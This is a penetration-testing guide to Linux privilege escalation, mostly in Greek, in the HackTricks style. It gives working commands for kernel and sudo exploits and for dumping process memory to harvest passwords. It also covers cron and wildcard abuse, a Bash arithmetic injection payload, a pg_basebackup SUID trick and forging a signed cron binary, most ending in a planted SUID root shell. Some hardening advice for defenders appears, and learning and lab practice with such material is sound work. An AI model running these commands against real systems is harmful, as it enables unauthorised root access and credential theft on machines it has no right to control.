# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Πληροφορίες Συστήματος

### Πληροφορίες OS

Ας ξεκινήσουμε να αποκτούμε γνώση του λειτουργικού συστήματος που τρέχει
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Διαδρομή

Εάν **έχετε δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στη μεταβλητή `PATH`** μπορεί να μπορέσετε να hijack κάποιες βιβλιοθήκες ή binaries:
```bash
echo $PATH
```
### Πληροφορίες Env

Υπάρχουν ενδιαφέρουσες πληροφορίες, κωδικοί ή API keys στις μεταβλητές περιβάλλοντος;
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Ελέγξτε την έκδοση του kernel και αν υπάρχει κάποιο exploit που μπορεί να χρησιμοποιηθεί για να escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Μπορείτε να βρείτε μια καλή λίστα με ευάλωτους πυρήνες και μερικά ήδη **compiled exploits** εδώ: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) και [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Άλλοι ιστότοποι όπου μπορείτε να βρείτε μερικά **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Για να εξαγάγετε όλες τις ευάλωτες εκδόσεις πυρήνα από αυτόν τον ιστότοπο μπορείτε να κάνετε:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Εργαλεία που μπορούν να βοηθήσουν στην αναζήτηση kernel exploits είναι:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Πάντα **αναζήτησε την έκδοση του kernel στο Google**, ίσως η έκδοση του kernel σου να αναφέρεται σε κάποιο kernel exploit και έτσι θα είσαι σίγουρος ότι αυτό το exploit είναι έγκυρο.

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

Με βάση τις ευάλωτες εκδόσεις του sudo που εμφανίζονται σε:
```bash
searchsploit sudo
```
Μπορείτε να ελέγξετε αν η έκδοση του sudo είναι ευάλωτη χρησιμοποιώντας αυτό το grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Οι εκδόσεις του sudo πριν την 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) επιτρέπουν σε μη προνομιούχους τοπικούς χρήστες να ανεβάσουν τα προνόμιά τους σε root μέσω της επιλογής sudo `--chroot` όταν το αρχείο `/etc/nsswitch.conf` χρησιμοποιείται από έναν κατάλογο ελεγχόμενο από τον χρήστη.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Από @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: η επαλήθευση υπογραφής απέτυχε

Δείτε το **smasher2 box of HTB** για ένα **παράδειγμα** του πώς αυτή η vuln θα μπορούσε να exploited.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Περαιτέρω enumeration του συστήματος
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Απαρίθμηση πιθανών αμυνών

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Αν βρίσκεστε μέσα σε ένα docker container, μπορείτε να προσπαθήσετε να διαφύγετε από αυτό:

{{#ref}}
docker-security/
{{#endref}}

## Δίσκοι

Ελέγξτε **what is mounted and unmounted**, πού και γιατί. Αν κάτι είναι unmounted, μπορείτε να δοκιμάσετε να το mount και να ελέγξετε για ιδιωτικές πληροφορίες
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Χρήσιμο λογισμικό

Καταγραφή χρήσιμων binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Επίσης, έλεγξε αν **είναι εγκατεστημένος κάποιος compiler**. Αυτό είναι χρήσιμο αν χρειαστεί να χρησιμοποιήσεις κάποιο kernel exploit, καθώς συνιστάται να το compile-άς στο μηχάνημα όπου θα το χρησιμοποιήσεις (ή σε ένα παρόμοιο).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Εγκατεστημένο ευάλωτο λογισμικό

Ελέγξτε την **έκδοση των εγκατεστημένων πακέτων και υπηρεσιών**. Ίσως υπάρχει κάποια παλιά έκδοση του Nagios (για παράδειγμα) που θα μπορούσε να εκμεταλλευτεί κανείς για αναβάθμιση προνομίων…\
Συνιστάται να ελέγξετε χειροκίνητα την έκδοση του πιο ύποπτου εγκατεστημένου λογισμικού.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Αν έχετε SSH πρόσβαση στο μηχάνημα, μπορείτε επίσης να χρησιμοποιήσετε το **openVAS** για να ελέγξετε για ξεπερασμένο και ευάλωτο λογισμικό που είναι εγκατεστημένο μέσα στο μηχάνημα.

> [!NOTE] > _Σημειώστε ότι αυτές οι εντολές θα εμφανίσουν πολλές πληροφορίες που κυρίως θα είναι άχρηστες, επομένως συνιστάται η χρήση εφαρμογών όπως το OpenVAS ή παρόμοιων που θα ελέγξουν αν οποιαδήποτε εγκατεστημένη έκδοση λογισμικού είναι ευάλωτη σε γνωστά exploits_

## Processes

Ρίξτε μια ματιά σε **ποιες διεργασίες** εκτελούνται και ελέγξτε αν κάποια διεργασία έχει **περισσότερα προνόμια από ό,τι θα έπρεπε** (ίσως ένα tomcat να εκτελείται από root;)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Επίσης **ελέγξτε τα δικαιώματά σας πάνω στα binaries των διεργασιών**, ίσως μπορείτε να αντικαταστήσετε κάποιο.

### Process monitoring

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.
Μπορείτε να χρησιμοποιήσετε εργαλεία όπως το [**pspy**](https://github.com/DominicBreuker/pspy) για να παρακολουθείτε διεργασίες. Αυτό μπορεί να είναι πολύ χρήσιμο για να εντοπίσετε ευάλωτες διεργασίες που εκτελούνται συχνά ή όταν πληρούνται συγκεκριμένες προϋποθέσεις.

### Process memory

Some services of a server save **credentials in clear text inside the memory**.\
Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\
However, remember that **as a regular user you can read the memory of the processes you own**.
Ορισμένες υπηρεσίες ενός server αποθηκεύουν **διαπιστευτήρια σε απλό κείμενο μέσα στη μνήμη**.\
Κανονικά θα χρειαστείτε **δικαιώματα root** για να διαβάσετε τη μνήμη διεργασιών που ανήκουν σε άλλους χρήστες, επομένως αυτό είναι συνήθως πιο χρήσιμο όταν είστε ήδη root και θέλετε να ανακαλύψετε περισσότερα διαπιστευτήρια.\
Ωστόσο, θυμηθείτε ότι **ως κανονικός χρήστης μπορείτε να διαβάσετε τη μνήμη των διεργασιών που σας ανήκουν**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.
> Σημειώστε ότι σήμερα οι περισσότερες μηχανές **δεν επιτρέπουν ptrace από προεπιλογή**, πράγμα που σημαίνει ότι δεν μπορείτε να dump άλλες διεργασίες που ανήκουν στον μη προνομιούχο χρήστη σας.
>
> Το αρχείο _**/proc/sys/kernel/yama/ptrace_scope**_ ελέγχει την προσβασιμότητα του ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: όλες οι διεργασίες μπορούν να debug-αριστούν, εφόσον έχουν το ίδιο uid. Αυτή είναι ο κλασικός τρόπος που λειτουργούσε το ptracing.
> - **kernel.yama.ptrace_scope = 1**: μόνο η γονική διεργασία μπορεί να debug-αριστεί.
> - **kernel.yama.ptrace_scope = 2**: Μόνο ο διαχειριστής μπορεί να χρησιμοποιήσει ptrace, καθώς απαιτείται η δυνατότητα CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Καμία διεργασία δεν μπορεί να παρακολουθηθεί με ptrace. Μόλις οριστεί, απαιτείται επανεκκίνηση για να ενεργοποιηθεί ξανά το ptracing.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
Αν έχετε πρόσβαση στη μνήμη μιας υπηρεσίας FTP (για παράδειγμα) μπορείτε να πάρετε το Heap και να αναζητήσετε μέσα σε αυτό τα διαπιστευτήριά της.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Σενάριο GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Για ένα δεδομένο ID διεργασίας, τα **maps δείχνουν πώς η μνήμη χαρτογραφείται μέσα στον εικονικό χώρο διευθύνσεων** της διεργασίας· δείχνουν επίσης τα **δικαιώματα κάθε χαρτογραφημένης περιοχής**. Το **mem** pseudo file **αποκαλύπτει την ίδια τη μνήμη της διεργασίας**. Από το αρχείο **maps** γνωρίζουμε ποιες **περιοχές μνήμης είναι αναγνώσιμες** και τα offsets τους. Χρησιμοποιούμε αυτές τις πληροφορίες για να **seek στο αρχείο mem και να dump όλες τις αναγνώσιμες περιοχές** σε ένα αρχείο.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` παρέχει πρόσβαση στη **φυσική** μνήμη του συστήματος, όχι στην εικονική μνήμη. Ο εικονικός χώρος διευθύνσεων του kernel μπορεί να προσεγγιστεί χρησιμοποιώντας /dev/kmem.\
Τυπικά, το `/dev/mem` είναι αναγνώσιμο μόνο από τον **root** και την ομάδα **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump για linux

Το ProcDump είναι μια επανερμηνεία για linux του κλασικού εργαλείου ProcDump από τη σουίτα εργαλείων Sysinternals για Windows. Βρες το στο [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Εργαλεία

Για να κάνετε dump τη μνήμη μιας διεργασίας μπορείτε να χρησιμοποιήσετε:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Μπορείτε χειροκίνητα να αφαιρέσετε τις απαιτήσεις root και να κάνετε dump τη διεργασία που ανήκει σε εσάς
- Script A.5 από [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (απαιτείται root)

### Διαπιστευτήρια από τη μνήμη διεργασίας

#### Χειροκίνητο παράδειγμα

Αν βρείτε ότι η διεργασία authenticator εκτελείται:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Μπορείτε να dump τη διαδικασία (δείτε τις προηγούμενες ενότητες για να βρείτε διαφορετικούς τρόπους να dump τη μνήμη μιας διαδικασίας) και να αναζητήσετε credentials μέσα στη μνήμη:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Το εργαλείο [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) θα **αποσπάσει διαπιστευτήρια σε απλό κείμενο από τη μνήμη** και από μερικά **γνωστά αρχεία**. Απαιτεί δικαιώματα root για να λειτουργήσει σωστά.

| Χαρακτηριστικό                                    | Όνομα Διαδικασίας    |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Αναζήτηση Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Προγραμματισμένα / Cron jobs

### Crontab UI (alseambusher) που τρέχει ως root – web-based scheduler privesc

Αν ένα web “Crontab UI” panel (alseambusher/crontab-ui) runs as root και είναι δεμένο μόνο στο loopback, μπορείς να το προσεγγίσεις μέσω SSH local port-forwarding και να δημιουργήσεις μια privileged job για privesc.

Τυπική αλυσίδα
- Εντοπίστε θύρα που ακούει μόνο στο loopback (π.χ., 127.0.0.1:8000) και το Basic-Auth realm μέσω `ss -ntlp` / `curl -v localhost:8000`
- Βρείτε credentials σε operational artifacts:
  - Backups/scripts με `zip -P <password>`
  - systemd unit που εκθέτει `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel και login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Δημιουργήστε μια εργασία υψηλών προνομίων και εκτελέστε την αμέσως (δημιουργεί SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Χρησιμοποιήστε το:
```bash
/tmp/rootshell -p   # root shell
```
Σκληροποίηση
- Μην τρέχετε το Crontab UI ως root· περιορίστε το σε έναν αφιερωμένο user με ελάχιστα δικαιώματα
- Bind σε localhost και επιπλέον περιορίστε την πρόσβαση μέσω firewall/VPN· μην επαναχρησιμοποιείτε passwords
- Αποφύγετε την ενσωμάτωση secrets σε unit files· χρησιμοποιήστε secret stores ή root-only EnvironmentFile
- Ενεργοποιήστε audit/logging για on-demand job executions

Ελέγξτε αν κάποια scheduled job είναι ευάλωτη. Ίσως μπορείτε να εκμεταλλευτείτε ένα script που εκτελείται από root (wildcard vuln; μπορείτε να τροποποιήσετε αρχεία που χρησιμοποιεί ο root; use symlinks; create specific files in the directory that root uses?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Για παράδειγμα, μέσα στο _/etc/crontab_ μπορείτε να βρείτε το PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Σημειώστε πως ο χρήστης "user" έχει δικαιώματα εγγραφής στο /home/user_)

If inside this crontab the root user tries to execute some command or script without setting the path. For example: _\* \* \* \* root overwrite.sh_\
Τότε, μπορείτε να αποκτήσετε root shell χρησιμοποιώντας:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron που εκτελεί script με wildcard (Wildcard Injection)

Εάν ένα script που εκτελείται από root περιέχει ένα “**\***” μέσα σε μια εντολή, μπορείτε να το εκμεταλλευτείτε για να προκαλέσετε απρόβλεπτες ενέργειες (όπως privesc). Παράδειγμα:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Αν το wildcard βρίσκεται μετά από μια διαδρομή όπως** _**/some/path/\***_ **, δεν είναι ευάλωτο (ούτε** _**./\***_ **είναι).**

Διαβάστε την παρακάτω σελίδα για περισσότερα wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Το Bash εκτελεί parameter expansion και command substitution πριν την arithmetic evaluation στα ((...)), $((...)) και let. Αν ένας root cron/parser διαβάζει μη αξιόπιστα πεδία log και τα τροφοδοτεί σε ένα arithmetic context, ένας attacker μπορεί να εισάγει ένα command substitution $(...) που εκτελείται ως root όταν τρέξει ο cron.

- Γιατί λειτουργεί: Στο Bash, οι expansions γίνονται με αυτή τη σειρά: parameter/variable expansion, command substitution, arithmetic expansion, και μετά word splitting και pathname expansion. Έτσι μια τιμή όπως `$(/bin/bash -c 'id > /tmp/pwn')0` αντικαθίσταται πρώτα (εκτελώντας την εντολή), μετά το υπόλοιπο αριθμητικό `0` χρησιμοποιείται για την arithmetic ώστε το script να συνεχίσει χωρίς σφάλματα.

- Τυπικό ευάλωτο pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Εκμετάλλευση: Βάλτε attacker-controlled κείμενο στο parsed log ώστε το πεδίο που μοιάζει αριθμητικό να περιέχει ένα command substitution και να τελειώνει με ένα ψηφίο. Βεβαιωθείτε ότι η εντολή σας δεν γράφει στο stdout (ή ανακατευθύνετέ το) ώστε η arithmetic να παραμένει έγκυρη.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Αν μπορείτε να **can modify a cron script** που εκτελείται από root, μπορείτε πολύ εύκολα να αποκτήσετε shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Αν το script που εκτελείται από root χρησιμοποιεί έναν **κατάλογο στον οποίο έχετε πλήρη πρόσβαση**, ίσως είναι χρήσιμο να διαγράψετε αυτόν τον φάκελο και να **δημιουργήσετε έναν symlink φάκελο προς κάποιον άλλο** που εξυπηρετεί ένα script ελεγχόμενο από εσάς
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Έλεγχος Symlink και ασφαλέστερος χειρισμός αρχείων

Κατά την ανασκόπηση privileged scripts/binaries που διαβάζουν ή γράφουν αρχεία μέσω μονοπατιού, επαληθεύστε πώς χειρίζονται τα symlink:

- `stat()` ακολουθεί ένα symlink και επιστρέφει τα μεταδεδομένα του στόχου.
- `lstat()` επιστρέφει τα μεταδεδομένα του ίδιου του symlink.
- `readlink -f` και `namei -l` βοηθούν να επιλυθεί ο τελικός στόχος και δείχνουν τα δικαιώματα κάθε στοιχείου του μονοπατιού.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Για defenders/developers, ασφαλέστερα patterns ενάντια σε symlink tricks περιλαμβάνουν:

- `O_EXCL` with `O_CREAT`: fail if the path already exists (blocks attacker pre-created symlink/files).
- `openat()`: operate relative to a trusted directory file descriptor.
- `mkstemp()`: create temporary files atomically with secure permissions.

### Custom-signed cron binaries with writable payloads
Blue teams sometimes "sign" cron-driven binaries by dumping a custom ELF section and grepping for a vendor string before executing them as root. If that binary is group-writable (e.g., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) and you can leak the signing material, you can forge the section and hijack the cron task:

1. Use `pspy` to capture the verification flow. In Era, root ran `objcopy --dump-section .text_sig=text_sig_section.bin monitor` followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` and then executed the file.
2. Recreate the expected certificate using the leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Build a malicious replacement (e.g., drop a SUID bash, add your SSH key) and embed the certificate into `.text_sig` so the grep passes:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite the scheduled binary while preserving execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Wait for the next cron run; once the naive signature check succeeds, your payload runs as root.

### Frequent cron jobs

Μπορείς να παρακολουθήσεις τις διεργασίες για να αναζητήσεις διεργασίες που εκτελούνται κάθε 1, 2 ή 5 λεπτά. Ίσως να μπορέσεις να το εκμεταλλευτείς και να escalate privileges.

Για παράδειγμα, για να **παρακολουθήσεις κάθε 0.1s για 1 λεπτό**, **ταξινομήσεις κατά τις λιγότερο εκτελεσμένες εντολές** και διαγράψεις τις εντολές που έχουν εκτελεστεί τις περισσότερες φορές, μπορείς να κάνεις:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Μπορείτε επίσης να χρησιμοποιήσετε** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (αυτό θα παρακολουθεί και θα καταγράφει κάθε διαδικασία που ξεκινά).

### Αντίγραφα ασφαλείας root που διατηρούν τα mode bits που έθεσε ο επιτιθέμενος (pg_basebackup)

Εάν ένα cron που ανήκει σε root τυλίγει `pg_basebackup` (ή οποιοδήποτε αναδρομικό αντίγραφο) κατά μήκος ενός καταλόγου βάσης δεδομένων στον οποίο μπορείτε να γράψετε, μπορείτε να φυτέψετε ένα **SUID/SGID binary** που θα αντιγραφεί ξανά ως **root:root** με τα ίδια mode bits στο αποτέλεσμα του backup.

Τυπική ροή ανακάλυψης (ως χρήστης DB με χαμηλά δικαιώματα):
- Χρησιμοποιήστε `pspy` για να εντοπίσετε ένα root cron που καλεί κάτι σαν `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` κάθε λεπτό.
- Επιβεβαιώστε ότι το source cluster (π.χ., `/var/lib/postgresql/14/main`) είναι εγγράψιμο από εσάς και ότι ο προορισμός (`/opt/backups/current`) γίνεται ιδιοκτησία του root μετά την εκτέλεση της εργασίας.

Εκμετάλλευση:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Αυτό λειτουργεί επειδή `pg_basebackup` διατηρεί τα file mode bits κατά την αντιγραφή του cluster· όταν καλείται από root, τα αρχεία προορισμού κληρονομούν **root ownership + attacker-chosen SUID/SGID**. Οποιαδήποτε παρόμοια privileged backup/copy ρουτίνα που διατηρεί τα permissions και γράφει σε μια executable τοποθεσία είναι ευάλωτη.

### Αόρατα cron jobs

Είναι δυνατόν να δημιουργηθεί ένα cronjob **τοποθετώντας ένα carriage return μετά από ένα σχόλιο** (χωρίς newline character), και το cron job θα λειτουργήσει. Παράδειγμα (σημειώστε τον χαρακτήρα carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Υπηρεσίες

### Εγγράψιμα _.service_ αρχεία

Ελέγξτε αν μπορείτε να γράψετε οποιοδήποτε `.service` αρχείο, αν μπορείτε, **μπορείτε να το τροποποιήσετε** ώστε να **εκτελεί** το **backdoor όταν** η υπηρεσία **ξεκινάει**, **επαναεκκινείται** ή **σταματάει** (ίσως χρειαστεί να περιμένετε μέχρι το μηχάνημα να επανεκκινηθεί).\
Για παράδειγμα, δημιουργήστε το backdoor σας μέσα στο .service αρχείο με **`ExecStart=/tmp/script.sh`**

### Εγγράψιμα εκτελέσιμα υπηρεσιών

Λάβετε υπόψη ότι αν έχετε **δικαιώματα εγγραφής σε binaries που εκτελούνται από υπηρεσίες**, μπορείτε να τα αλλάξετε για να βάλετε backdoors ώστε όταν οι υπηρεσίες επανεκτελεστούν να εκτελεστούν και τα backdoors.

### systemd PATH - Σχετικές Διαδρομές

Μπορείτε να δείτε το PATH που χρησιμοποιεί το **systemd** με:
```bash
systemctl show-environment
```
Αν βρείτε ότι μπορείτε να **write** σε οποιονδήποτε από τους φακέλους της διαδρομής, μπορεί να καταφέρετε να **escalate privileges**. Πρέπει να αναζητήσετε **relative paths being used on service configurations** αρχεία όπως:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
